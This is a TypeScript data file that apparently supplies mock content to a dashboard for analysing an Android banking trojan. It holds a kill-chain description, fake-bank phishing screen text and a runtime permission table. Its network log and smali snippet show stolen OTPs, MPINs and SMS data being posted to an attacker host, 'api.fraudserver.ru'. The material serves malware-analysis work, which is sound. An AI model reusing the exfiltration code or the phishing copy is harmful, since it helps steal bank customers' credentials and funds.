export type PipelineStep = {
  tag: string
  message: string
  tone: "system" | "static" | "dynamic" | "automation" | "network" | "genai"
}

export const PIPELINE_STEPS: PipelineStep[] = [
  {
    tag: "SYSTEM",
    message: "Unpacking Dalvik Executable payload via JADX Deconstruction Core...",
    tone: "system",
  },
  {
    tag: "STATIC",
    message: "Parsing AndroidManifest.xml structure & extracting permission arrays...",
    tone: "static",
  },
  {
    tag: "DYNAMIC",
    message: "Initializing Headless AVD Sandbox Container (Android 11 / API Level 30)...",
    tone: "dynamic",
  },
  {
    tag: "AUTOMATION",
    message: "Firing active interface event streams via automated ADB Monkey engine...",
    tone: "automation",
  },
  {
    tag: "NETWORK",
    message: "Intercepting deep HTTPS transmission frames using live mitmproxy listener...",
    tone: "network",
  },
  {
    tag: "GENAI",
    message: "Serializing multi-module behavioral JSON metrics to Claude Intelligence Core...",
    tone: "genai",
  },
]

export type Permission = {
  name: string
  critical: boolean
}

export const PERMISSIONS: Permission[] = [
  { name: "INTERNET", critical: false },
  { name: "ACCESS_NETWORK_STATE", critical: false },
  { name: "READ_SMS", critical: true },
  { name: "RECEIVE_SMS", critical: true },
  { name: "BIND_ACCESSIBILITY_SERVICE", critical: true },
  { name: "WAKE_LOCK", critical: false },
  { name: "VIBRATE", critical: false },
  { name: "SEND_SMS", critical: true },
  { name: "READ_CONTACTS", critical: true },
  { name: "SYSTEM_ALERT_WINDOW", critical: true },
  { name: "FOREGROUND_SERVICE", critical: false },
  { name: "RECEIVE_BOOT_COMPLETED", critical: false },
  { name: "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", critical: false },
  { name: "CALL_PHONE", critical: true },
  { name: "QUERY_ALL_PACKAGES", critical: true },
  { name: "READ_PHONE_STATE", critical: false },
]

export type StoryboardScreen = {
  id: number
  title: string
  subtitle: string
  device: {
    bankName: string
    headline: string
    body: string
    variant: "splash" | "modal" | "credentials" | "otp"
  }
}

export const STORYBOARD: StoryboardScreen[] = [
  {
    id: 1,
    title: "Authority Impersonation",
    subtitle: "Fake Bank Splash Page",
    device: {
      bankName: "UnionTrust Secure",
      headline: "Welcome to UnionTrust Mobile",
      body: "Your trusted partner for secure banking. Initializing encrypted session...",
      variant: "splash",
    },
  },
  {
    id: 2,
    title: "Urgency Engineering",
    subtitle: "Account Block Warning Modal",
    device: {
      bankName: "UnionTrust Secure",
      headline: "Account Temporarily Blocked",
      body: "Suspicious activity detected. Verify your identity within 10 minutes to avoid permanent suspension.",
      variant: "modal",
    },
  },
  {
    id: 3,
    title: "Credential Harvest Screen",
    subtitle: "Login Credential Capture",
    device: {
      bankName: "UnionTrust Secure",
      headline: "Verify Your Identity",
      body: "Enter your Customer ID and MPIN to restore full account access.",
      variant: "credentials",
    },
  },
  {
    id: 4,
    title: "Intercepted OTP Input Capture",
    subtitle: "One-Time Password Theft",
    device: {
      bankName: "UnionTrust Secure",
      headline: "Enter OTP Code",
      body: "A 6-digit code was sent to your registered number. Enter it to confirm.",
      variant: "otp",
    },
  },
]

export type RuntimeDelta = {
  permission: string
  declared: boolean
  runtime: boolean
  note: string
}

export const RUNTIME_DELTA: RuntimeDelta[] = [
  { permission: "READ_SMS", declared: true, runtime: true, note: "Active exfiltration of inbox" },
  { permission: "BIND_ACCESSIBILITY_SERVICE", declared: true, runtime: true, note: "Overlay + auto-tap observed" },
  { permission: "SEND_SMS", declared: false, runtime: true, note: "Hidden dynamic invocation (obfuscated)" },
  { permission: "RECORD_AUDIO", declared: false, runtime: true, note: "Reflection-loaded at runtime" },
  { permission: "CAMERA", declared: true, runtime: false, note: "Declared but never triggered (decoy)" },
  { permission: "READ_CONTACTS", declared: true, runtime: true, note: "Harvested for spam propagation" },
]

export const KILL_CHAIN = [
  { stage: 1, title: "Phishing Link", detail: "Victim receives a smishing SMS with a shortened APK download link impersonating the bank." },
  { stage: 2, title: "Accessibility Exploit", detail: "On install, the app coerces the user into granting Accessibility Service for full UI control." },
  { stage: 3, title: "Phishing Screen Overlay", detail: "A pixel-perfect fake banking login overlay is drawn on top of the legitimate app." },
  { stage: 4, title: "Credential Theft", detail: "Customer ID and MPIN are captured via keystroke logging and form scraping." },
  { stage: 5, title: "SMS OTP Interception", detail: "Incoming OTP messages are silently read and forwarded before the user sees them." },
  { stage: 6, title: "C2 Server Exfiltration", detail: "Stolen data is POSTed to a hardcoded command-and-control endpoint over HTTPS." },
  { stage: 7, title: "Financial Extradition", detail: "Automated beneficiary addition and fund transfers drain the victim account." },
]

export const MITM_LOG: { time: string; text: string; critical?: boolean }[] = [
  { time: "12:04:11.882", text: "GET https://cdn.uniontrust-secure.app/assets/splash.png  200 OK" },
  { time: "12:04:13.114", text: "POST https://telemetry.uniontrust-secure.app/init  200 OK" },
  { time: "12:04:19.557", text: "TLS handshake -> 185.220.101.44:443  (self-signed cert)" },
  {
    time: "12:04:22.901",
    text: "CRITICAL NETWORK ALARM: POST https://api.fraudserver.ru/collect - Form Data intercepted: { target_account: 1234567890, victim_otp: 847291, balance_drain: true }",
    critical: true,
  },
  { time: "12:04:24.330", text: "POST https://api.fraudserver.ru/heartbeat  200 OK" },
  {
    time: "12:04:27.715",
    text: "CRITICAL NETWORK ALARM: POST https://api.fraudserver.ru/sms - { mpin: 4471, contacts_count: 312, sim_serial: 89910... }",
    critical: true,
  },
  { time: "12:04:31.002", text: "GET https://api.fraudserver.ru/cmd?id=device_8821  -> { action: 'add_beneficiary' }" },
]

export const SMALI_SNIPPET = `.method private interceptOtp(Landroid/content/Intent;)V
    .locals 4
    const-string v0, "android.provider.Telephony.SMS_RECEIVED"
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v2
    if-eqz v2, :cond_0
    invoke-direct {p0, p1}, Lcom/x9f/core/Hook;->extractPdu(...)V
    const-string v3, "https://api.fraudserver.ru/sms"
    invoke-static {v3}, Lcom/x9f/net/Beacon;->post(Ljava/lang/String;)V
    :cond_0
    return-void
.end method`
